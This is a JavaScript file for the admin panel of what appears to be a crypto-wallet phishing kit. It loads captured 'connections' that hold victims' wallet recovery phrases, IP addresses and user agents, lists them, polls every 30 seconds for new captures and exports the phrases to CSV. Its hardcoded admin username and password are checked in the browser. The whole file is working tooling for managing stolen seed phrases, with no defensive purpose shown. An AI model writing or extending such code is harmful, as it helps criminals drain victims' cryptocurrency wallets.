document.addEventListener("DOMContentLoaded", () => {
  // DOM Elements
  const loginModal = document.getElementById("login-modal")
  const adminDashboard = document.getElementById("admin-dashboard")
  const loginBtn = document.getElementById("login-btn")
  const logoutBtn = document.getElementById("logout-btn")
  const username = document.getElementById("username")
  const password = document.getElementById("password")
  const loginError = document.getElementById("login-error")
  const refreshBtn = document.getElementById("refresh-btn")
  const exportBtn = document.getElementById("export-btn")
  const lastUpdated = document.getElementById("last-updated")
  const totalConnections = document.getElementById("total-connections")
  const todayConnections = document.getElementById("today-connections")
  const uniqueWallets = document.getElementById("unique-wallets")
  const connectionsTable = document.getElementById("connections-table")
  const connectionsTbody = document.getElementById("connections-tbody")
  const emptyMessage = document.getElementById("empty-message")
  const walletFilter = document.getElementById("wallet-filter")
  const dateFilter = document.getElementById("date-filter")
  const detailsModal = document.getElementById("details-modal")
  const closeModalBtns = document.querySelectorAll(".close-modal, .close-modal-btn")
  const deleteConnectionBtn = document.getElementById("delete-connection-btn")
  const toast = document.getElementById("toast")
  const toastMessage = document.getElementById("toast-message")

  // Current activities data
  let activitiesData = []
  let selectedActivity = null

  // Check if user is logged in
  function checkAuth() {
    const isLoggedIn = localStorage.getItem("isAdminLoggedIn") === "true"
    if (isLoggedIn) {
      showDashboard()
      loadData()
    } else {
      showLoginModal()
    }
  }

  // Show login modal
  function showLoginModal() {
    loginModal.classList.remove("hidden")
    adminDashboard.classList.add("hidden")
  }

  // Show dashboard
  function showDashboard() {
    loginModal.classList.add("hidden")
    adminDashboard.classList.remove("hidden")
  }

  // Handle login
  function handleLogin() {
    const usernameValue = username.value.trim()
    const passwordValue = password.value.trim()

    if (usernameValue === "cblsupport001" && passwordValue === "og001cbl") {
      localStorage.setItem("isAdminLoggedIn", "true")
      showDashboard()
      loadData()
      username.value = ""
      password.value = ""
      loginError.textContent = ""
    } else {
      loginError.textContent = "Invalid username or password"
    }
  }

  // Handle logout
  function handleLogout() {
    localStorage.removeItem("isAdminLoggedIn")
    showLoginModal()
  }

  // Format date
  function formatDate(dateString) {
    const date = new Date(dateString)
    return date.toLocaleString("en-US", {
      year: "numeric",
      month: "short",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
    })
  }

  // Load data from server
  function loadData() {
    fetch("/api/activities")
      .then((response) => response.json())
      .then((data) => {
        activitiesData = data.activities || []
        updateLastUpdated()
        updateStats()
        renderTable()
      })
      .catch((error) => {
        console.error("Error loading data:", error)
        showToast("Error loading data. Please try again.")
      })
  }

  // Update last updated timestamp
  function updateLastUpdated() {
    const now = new Date()
    lastUpdated.textContent = `Last updated: ${now.toLocaleString()}`
  }

  // Update stats
  function updateStats() {
    // Total connections
    totalConnections.textContent = activitiesData.length

    // Today's connections
    const today = new Date().setHours(0, 0, 0, 0)
    const todayActivitiesCount = activitiesData.filter((activity) => {
      const activityDate = new Date(activity.timestamp).setHours(0, 0, 0, 0)
      return activityDate === today
    }).length
    todayConnections.textContent = todayActivitiesCount

    // Unique wallets
    const uniqueWalletTypes = [...new Set(activitiesData.map((activity) => activity.wallet))]
    uniqueWallets.textContent = uniqueWalletTypes.length
  }

  // Render table with filtered data
  function renderTable() {
    let filteredData = [...activitiesData]

    // Apply wallet filter
    const walletFilterValue = walletFilter.value
    if (walletFilterValue !== "all") {
      filteredData = filteredData.filter((activity) => activity.wallet === walletFilterValue)
    }

    // Apply date filter
    const dateFilterValue = dateFilter.value
    if (dateFilterValue !== "all") {
      const now = new Date()
      const today = new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime()

      if (dateFilterValue === "today") {
        filteredData = filteredData.filter((activity) => {
          const activityDate = new Date(activity.timestamp).getTime()
          return activityDate >= today
        })
      } else if (dateFilterValue === "yesterday") {
        const yesterday = today - 24 * 60 * 60 * 1000
        filteredData = filteredData.filter((activity) => {
          const activityDate = new Date(activity.timestamp).getTime()
          return activityDate >= yesterday && activityDate < today
        })
      } else if (dateFilterValue === "week") {
        const lastWeek = today - 7 * 24 * 60 * 60 * 1000
        filteredData = filteredData.filter((activity) => {
          const activityDate = new Date(activity.timestamp).getTime()
          return activityDate >= lastWeek
        })
      } else if (dateFilterValue === "month") {
        const lastMonth = today - 30 * 24 * 60 * 60 * 1000
        filteredData = filteredData.filter((activity) => {
          const activityDate = new Date(activity.timestamp).getTime()
          return activityDate >= lastMonth
        })
      }
    }

    // Clear table
    connectionsTbody.innerHTML = ""

    // Show empty message if no data
    if (filteredData.length === 0) {
      emptyMessage.classList.remove("hidden")
      connectionsTable.classList.add("hidden")
      return
    }

    // Hide empty message and show table
    emptyMessage.classList.add("hidden")
    connectionsTable.classList.remove("hidden")

    // Render table rows
    filteredData.forEach((activity, index) => {
      const tr = document.createElement("tr")

      // Truncate phrase for table display
      const truncatedPhrase = activity.phrase.length > 30 ? activity.phrase.substring(0, 30) + "..." : activity.phrase

      tr.innerHTML = `
        <td>${index + 1}</td>
        <td>${capitalizeFirstLetter(activity.wallet)}</td>
        <td>${truncatedPhrase}</td>
        <td>${formatDate(activity.timestamp)}</td>
        <td>${activity.ip || "Unknown"}</td>
        <td>
          <button class="action-btn view-details" data-index="${index}">View Details</button>
        </td>
      `

      connectionsTbody.appendChild(tr)
    })

    // Add event listeners to view details buttons
    document.querySelectorAll(".view-details").forEach((btn) => {
      btn.addEventListener("click", function () {
        const index = Number.parseInt(this.getAttribute("data-index"))
        const activity = filteredData[index]
        showDetails(activity)
      })
    })
  }

  // Capitalize first letter
  function capitalizeFirstLetter(string) {
    return string.charAt(0).toUpperCase() + string.slice(1)
  }

  // Show details modal
  function showDetails(activity) {
    selectedActivity = activity

    document.getElementById("detail-wallet").textContent = capitalizeFirstLetter(activity.wallet)
    document.getElementById("detail-phrase").textContent = activity.phrase
    document.getElementById("detail-time").textContent = formatDate(activity.timestamp)
    document.getElementById("detail-ip").textContent = activity.ip || "Unknown"
    document.getElementById("detail-useragent").textContent = activity.userAgent || "Unknown"

    detailsModal.classList.remove("hidden")
  }

  // Hide details modal
  function hideDetailsModal() {
    detailsModal.classList.add("hidden")
    selectedActivity = null
  }

  // Show toast message
  function showToast(message) {
    toastMessage.textContent = message
    toast.classList.add("show")

    setTimeout(() => {
      toast.classList.remove("show")
    }, 3000)
  }

  // Export data to CSV
  function exportToCSV() {
    if (activitiesData.length === 0) {
      showToast("No data to export")
      return
    }

    // Create CSV content
    let csvContent = "data:text/csv;charset=utf-8,"
    csvContent += "ID,Wallet,Recovery Phrase,Date & Time,IP Address,User Agent\n"

    activitiesData.forEach((activity, index) => {
      const row = [
        index + 1,
        activity.wallet,
        `"${activity.phrase.replace(/"/g, '""')}"`, // Escape quotes in CSV
        formatDate(activity.timestamp),
        activity.ip || "Unknown",
        `"${(activity.userAgent || "Unknown").replace(/"/g, '""')}"`,
      ]

      csvContent += row.join(",") + "\n"
    })

    // Create download link
    const encodedUri = encodeURI(csvContent)
    const link = document.createElement("a")
    link.setAttribute("href", encodedUri)
    link.setAttribute("download", `wallet-connections-${new Date().toISOString().slice(0, 10)}.csv`)
    document.body.appendChild(link)

    // Trigger download
    link.click()
    document.body.removeChild(link)
  }

  // Event listeners
  loginBtn.addEventListener("click", handleLogin)
  logoutBtn.addEventListener("click", handleLogout)
  refreshBtn.addEventListener("click", loadData)
  exportBtn.addEventListener("click", exportToCSV)

  walletFilter.addEventListener("change", renderTable)
  dateFilter.addEventListener("change", renderTable)

  closeModalBtns.forEach((btn) => {
    btn.addEventListener("click", hideDetailsModal)
  })

  deleteConnectionBtn.addEventListener("click", () => {
    if (selectedActivity) {
      // In a real application, you would send a delete request to the server
      showToast("Delete functionality would be implemented here")
      hideDetailsModal()
    }
  })

  // Check for new connections every 30 seconds
  setInterval(() => {
    if (localStorage.getItem("isAdminLoggedIn") === "true") {
      fetch("/api/activities")
        .then((response) => response.json())
        .then((data) => {
          const newActivities = data.activities || []
          if (newActivities.length > activitiesData.length) {
            const newCount = newActivities.length - activitiesData.length
            showToast(`${newCount} new connection(s) detected!`)
            activitiesData = newActivities
            updateStats()
            renderTable()
          }
        })
        .catch((error) => {
          console.error("Error checking for new connections:", error)
        })
    }
  }, 30000)

  // Initialize
  checkAuth()

  // Handle Enter key in login form
  password.addEventListener("keypress", (e) => {
    if (e.key === "Enter") {
      handleLogin()
    }
  })
})
